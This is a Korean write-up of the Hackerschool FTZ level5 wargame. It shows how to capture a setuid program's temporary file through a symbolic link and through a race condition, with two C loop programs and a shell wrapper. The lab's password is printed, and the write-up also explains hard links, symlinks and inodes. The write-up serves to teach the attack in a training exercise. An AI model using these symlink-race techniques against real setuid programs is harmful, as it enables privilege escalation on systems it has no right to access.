# FTZ 5  
## 문제 설명  

```
/usr/bin/level5 프로그램은 /tmp 디렉토리에
level5.tmp 라는 이름의 임시파일을 생성한다.

이를 이용하여 level6의 권한을 얻어라.
```  


## 문제 풀이  
### 풀이 과정  
1. 일단 /usr/bin/level5 파일의 정보를 얻어보자.  
```ls -al /usr/bin/level5```  
**-rws--x---  1 level6  level5**  
해당 파일의 소유주는 lvel6이고 실행권한과 setuid가 걸려있다(s).  
*참고로 대문자가 쓰인 경우는 실행권한은 없는데 setuid만 적용되었다는 뜻이다*  
그렇다면 이 파일을 이용해서 쉘을 실행 시키거나, my-pass를 실행시키면 level6의 패스워드를 알 수 있을 것 같다.  

2. /usr/bin/level5 파일을 실행시켜보자.  
```/usr/bin/level5```  
실행 후 /tmp 폴더에 가보면, level5.tmp라는 임시파일이 생성되지 않았음을 알 수 있다.  
어떻게 된 일일까?!  
일단 프로그래밍 종료되기 직전 해당 파일을 삭제한 것으로 추측이 가능.  
그렇다면 level5.tmp가 생성되고 삭제되기 바로 직전에 이 파일을 가로채려면 어떻게 해야할까?!  

3-(1). 여러 방법이 있지만 우선 심볼링 링크(symbolic link)를 이용해서 풀어보자.  
* /tmp 디렉토리에 b라는 파일을 만든다. ```/tmp/b```  
* /tmp/b에 level5.tmp라고 심볼릭 링크를 걸어준다.  
* /usr/bin이 수행되면서 level5.tmp에 level6의 패스워드를 쓴다.(이걸 어떻게 알아?! 그럼 이 문제에서 비번 어디서 얻겠니..그래도 의심이 들면 직접 gdb로 분석해ㅂ자)  
* level5.tmp가 지워져도 /tmp/b는 남아있다.  
즉, /tmp/b라는 파일을 만들고, 심볼릭 링크를 통해 level5.tmp의 가명을 만드는 것이다.  
그렇게되면, /usr/bin/level5라는 프로그램이 level5.tmp에 쓰기 연산을 수행하지만, level5.tmp는 tmp/b에 연결되어 있으므로, tmp/b에 데이터를 쓰게 되는 것.  

```touch b``` : touch 파일명(해당 파일이 없는 경우에) => 빈 파일 생성  
> ```cat > b``` 해도 같은 결과  

```ln -s b level5.tmp``` : b 파일에 level5.tmp라는 심볼릭 링크를 걸어준다.  
```ls -al``` : 링크 관계 확인  
<img width="373" alt="캡처" src="https://user-images.githubusercontent.com/46364778/92199987-971c6a80-eeb3-11ea-900b-de11ec707113.PNG">  

**심볼릭 링크 level5.tmp의 경우에는 맨 앞에 심볼릭 링크를 뜻하는 'l'이 붙어 있고, ->라는 표시로 A를 가리키고 있다.**  

4. 이제 b에 접근하는 방법은 2가지가 되었다.  
* /tmp/b 라는 진짜 이름으로 접근  
* /tmp/level5.tmp 라는 가명으로 접근  

여기서 만약 /usr/bin/level5 프로그램을 실행시키면, 해당 프로그램에서 level5.tmp 파일을 만들고 해당 내용에 패스워드를 출력할 것이다.  
```/usr/bin/level5```  

5. 그리고 이제 b를 출력해보자  
```cat b```  
**next password : what the hell**  

---  

심볼릭링크를 이용한 해킹방법이 알려지고 나서, 그 대처방안으로 프로그램이 임시파일을 생성할 때 이미 같은 이름의 파일이 존재하면 그 파일을 삭제하고 새로이 임시파일을 생성하는 방향으로 발전되었다.  
컴퓨터는 다음과 같은 순서에 따라 이 작업을 수행하게 된다.  
1. 프로그램을 실행한다.  
2. 생성한 임시파일과 같은 이름의 파일이 있는지 검사한다.  
3. 같은 이름의 파일이 있으면 삭제를 하고, 없다면 그냥 pass  
4. 임시 파일을 생성한다.  

우리가 심볼릭 링크를 만들어 놓으면 3번에 의해서 삭제가 되어버리므로 무용지물이 된다.  

그러면 어떻게 해야할까?!  
3번에서 삭제를 해버린다면 우리는 3번 이후에 심볼릭 링크를 생성하면 된다.  
바로 3번과 4번 사이를 노리는 것이다.  
그러나 정확히 3번과 4번 사이에 심볼릭 링크를 생성하기는 어렵다.  
그래서 고안된 방법이 '반복'이다. 두 개의 프로그램을 동시에 시행시킨다면 컴퓨터는 두개의 프로그램이 원하는 작업을 모두 수행해야한다.  

그래서 첫째 프로그램이 1을 시키고, 둘째 프로그램이 2를 시킨다면 121212 이런식으로 일은 하던지 12112211212 이런식으로 하던지 특정한 작업 순서에 따라서 두 프로그램이 요구하는 작업을 하게 될 것이다.  

이러한 특성을 이용하여 **root 권한의 setuid가 걸려있는 프로그램을 반복 실행**시키는 프로그램을 만든다. 그리고 **심볼릭 링크를 생성하는 명령을 반복하는 프로그램**을 만들어 두 개의 프로그램을 실행시킨다.  

그래서 우리는 두 개의 프로그램이 심볼릭 링크를 삭제하고 생성하기를 반복하다 보면 언젠가 한번쯤 3번과 4번사이에 심볼릭 링크를 생성하는 명령이 수행되겠지 하고 기대하는 것이다. 딱 한번만이라도 3번과 4번 사이에 심볼릭 링크가 생성된다면 우리가 목적한느 바가 이루어지는 것이기 때문이다.  

이렇게 두 개의 프로그램이 각자 삭제하고 생성하고를 경쟁하고 있는 상태라 하여  
**레이스 컨디션**(race=경쟁, condition=상태)라고 하는 공격 기법이 탄생하게 된 것이다!  

3-(2). 레이스컨디션을 이용해서 풀어보자.  
**level5를 반복 실행하도록 하는 프로그램(loop1)**  
```
#include <unistd.h>

int main() {
  int i;
  for(i=0; i<=1000; i++)
  {
    system("/usr/bin/level5");
  }
}
```  

**심볼릭 링크 생성을 반복하는 프로그램(loop2)**  
```
#include <unistd.h>

int main() {
  int i;
  for (i=0; i<=1000; i++)
  {
    system("ln -s /tmp/b /tmp/level5.tmp");  
  }
}

```  
/tmp/level5.tmp을 어떤 원본 파일(b)의 심볼릭 링크 파일로 만든 것이다.  
따라서 /tmp/level5.tmp 파일에 어떤 내용이 써진다면, 원본파일(b)에도 같은 내용이 써질 것이다.  

**심볼릭링크의 원본(목적)파일 b**  
```cd /tmp```  
```touch b``` 혹은 ```cat > b```  

4. 각자 소스 컴파일  
```gcc -o loop1 loop1.c```  
```gcc -o loop2 loop2.c```  

그러면 두 개의 프로그램을 동시에 수행하도록 해야한다. 동시에 수행하도록 하려면 **하나의 프로그램은 백그라운드에서 수행**하도록 하고 **다른 프로그램을 실행**시키면 된다.  
* 방법은 & 문자를 이용한다.  

loop1을 실행하는데 &을 붙여주면 프로그램 수행을 백그라운드로 보낸다는 의미다.  
&을 붙이고 프로그램을 실행하면 바로 쉘을 사용할 수 있지만,  
&을 붙이지 않는다면 프로그램 수행이 완료될 때까지는 다른 명령을 수행할 수 없다.  

```
[level5@ftz tmp]$ ./loop1 &
[3] 16585
[level5@ftz tmp]$ ./loop2
ln: `/tmp/level5.tmp': 파일이 존재합니다
ln: `/tmp/level5.tmp': 파일이 존재합니다
...
...
[level5@ftz tmp]$
```  

+ 이렇게 실행하면 타이밍을 맞추기 힘들다. 좀 더 자동화된 방법을 생각해보자.  

**쉘 스크립트 사용**  
```
// 쉘 스크립트 작성
// Bash.sh
#!/bin/bash
./loop1& ./loop2

// 실행
[level5@ftz tmp]$ sh Bash.sh
ln: `/tmp/level5.tmp': 파일이 존재합니다
ln: `/tmp/level5.tmp': 파일이 존재합니다
...
```  

5. 모든 작업이 끝났다! level5 프로그램이 생성하는 level5.tmp 파일의 내용이 b 파일에 쓰기 되었는지 확인하자!  
```cat ./b```  
**next password : what the hell**  


## 연관된 정보들  
### 리눅스의 링크 기능  
윈도우로 치면 '바로가기' 같은 개념으로, 리눅스에도 링크 기능이 있다. 특정 파일이나 디렉토리에 링크를 걸어 사용할 수 있는데, 링크에는 두 종류가 있다.  
* 하드 링크(hard link)  
* 심볼릭 링크(symbolic link)  

### 하드 링크(hard link)  
원본 파일과 동일한 icode를 가진다. 그렇기 때문에 원본 파일이 삭제 되더라도 원본 파일의 inode를 갖고 있는 링크 파일은 여전히 사용 가능하다. 사실 링크라는 표현도 애매하다. 같은 inode를 가르키는 서로 다른 이름이라고나 할까? 원본이라는 개념이 없다.  

하드 링크 명령을 해보면 cp 명령과 별다른 차이가 없음을 알 수 있다. 하지만 하드링크와 cp명령어는 다른 명령어이므로 주의해야한다.  
파일A(20M)를 생성하고 하드링크 B를 생성하면, 각각의 폴더가 20M씩 용량을 차지하는 것처럼 보이지만 A,B파일이 전체 용량을 차지하는건 10M밖에 되지 않는다.  
하드링크는 **파일을 카리키는 이름을 하나 더 만드는 것**이라고 생각하면 된다.  
* 이런 경우 원본인 파일 A를 지우더라도 하드 링크 B는 내용을 간직하고 있다.  

**하드 링크 설정 방법**  
```ln [대상 원본 파일][하드 링크 파일명]```  


> **inode란?**  
![파일](https://user-images.githubusercontent.com/46364778/92200987-46f2d780-eeb6-11ea-9988-0c4914379ad3.png)  

> 파일을 기술하는 디스크 상의 데이터 구조로서, 파일의 데이터 블록이 디스크 상의 어느 주소에 위치하고 있는가와 같은 파일에 대한 중요한 정보를 갖고 있다.  
> 각각의 inode들은 i-번호 라고 하는 고유한 식별 번호를 갖고 있다.  
> inode의 숫자는 파일 시스템이 갖고 있을 수 있는 최대 파일 수가 된다.  
> inode에 저장되어 있는 정보  
> * 파일의 소유권(사용자, 그룹)  
> * 파일의 액세스 모드  
> * 파일의 타임스탬프(파일의 마지막 수정, 액세스)  
> * 파일의 종류  
> **inode 확인 명령어**  
> ```ls -i(i옵션: 파일의 i-번호를 보여준다.)```  

### 심볼릭 링크(Symbolic link)  
링크를 연결하여 원본 파일을 직접 사용하는 것과 같은 효과를 내는 링크이다.  
특정 폴더에 링크를 걸어 NAS, library 원본 파일을 사용하기 위해 심볼릭 링크를 사용한다.  

파일 A의 심볼릭 링크 B를 예시로 들면,  
* 심볼릭 링크 B의 경우에는 맨 앞에 심볼릭 링크를 뜻하는 'l'가 붙어 있고, -> 라는 표시로 A를 가리키고 있다.  
* 심볼릭 링크 B는 단지 파일 A를 가리키고 있을 뿐, B파일을 호출하게 되면 파일 A로 연결된다.  
* 생성한 심볼릭 링크는 원본 파일 A를 가리키고 있는 것에 불과하므로 A를 삭제하면, B가 가리키는 파일이 없어지게 된다. 이런 경우, 심볼릭 링크 B는 무용지물이 된다.  
* 파일 A를 수정하면 심볼릭 링크 B도 수정된다.  
* **심볼릭 링크 B를 수정해도 원본 파일인 A가 수정된다.**  


**심볼릭 링크 설정 방법**  
```ln -s [대상 원본 파일][심볼릭링크 파일명]```  

**심볼릭 링크 해제**  
```rm [링크파일]```  


즉, 파일 A를 생성하고 저장하면 하드 드라이브에 A의 내용이 기록된다.  
파일 A의 위치 정보 역시 헤더 부분에 저장된다.  
A라는 파일의 이름은 헤더에 있는 위치 정보만을 가지고 있게 되는 것이다.  
파일 A를 열 때 이 파일이 가지고 있는 위치 정보를 이용해 하드에서 내용을 찾아서 사용하게 된다.  

**하드 링크**는 이 위치 정보를 가지고 있는 이름을 여러개 생성한다고 생각하면 된다. 그렇기 때문에 하나의 파일을 지워도 그것이 원본 파일 여부에 상관없이 하드에서 내용을 찾아갈 수 있는 것이다. 따라서 하드링크의 파일을 지우고자 한다면 두 개의 파일 모두를 지워야한다.  

**심볼릭 링크**는 위치정보를 가지고 있는 파일명을 또 한번 다른 이름으로 연결하는 것이다. 그렇기 때문에 원본 파일이 삭제되면 심볼릭 링크의 위치 정보가 사라지기 때문에 쓸모없는 파일이 된다.  

### Race Condition  
이렇게 하나의 프로그램은 계속해서 심볼릭 링크를 삭제하고, 다른 프로그램은 계속해서 심볼릭 링크를 생성하고 두 프로그램은 서로 경쟁하고 있다. 그래서 이러한 상태를 Race Condition(경쟁 상태)라고 한다.  

#### Race Condition 조건  
* 해당 프로그램에 root 권한의 setuid가 걸려있을 것  
* 프로그램 실행 도중 어떤 파일을 생성할 것  
* 그 생성되는 파일의 이름과 위치를 알고 있을 것  
* 파일이 생성되는 디렉토리에 쓰기 권한을 가지고 있을 것




